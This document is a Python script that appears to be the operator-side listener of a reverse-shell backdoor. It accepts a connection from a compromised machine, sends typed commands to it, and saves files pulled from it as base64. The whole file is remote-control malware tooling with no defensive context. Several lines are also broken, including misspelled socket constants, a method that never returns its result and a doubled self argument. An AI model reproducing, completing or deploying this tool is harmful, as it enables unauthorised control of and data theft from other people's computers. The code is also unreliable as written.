import socket
import json
import base64
class Listener:
    
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        listener.setsockopt(socket.SDL_SOCKET,socket.SO_REUSEADOR,1)

        listener.bind((ip,port))
        listener.listen(0)
        self.connection,address=listener.accept()

        print("got an connection from the adrdess :"+str(address))

    def send_command(self,command):
        self.reliable_send(command)
        if(command[0]=="exit"):
            self.connection.close()
            exit()
        result = self.reliable_recieve()

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
        return "download successful"

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def reliable_recieve(self):
        json_data=""
        while True:
            try:
                json_data=json_data+ self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):

        while True:
            command = input(">> ")
            command = command.split(" ")


            result= self.send_command(self,command)
            if (command[0] == "download"):
                result= self.write_file(command[2],result)
            print(result)

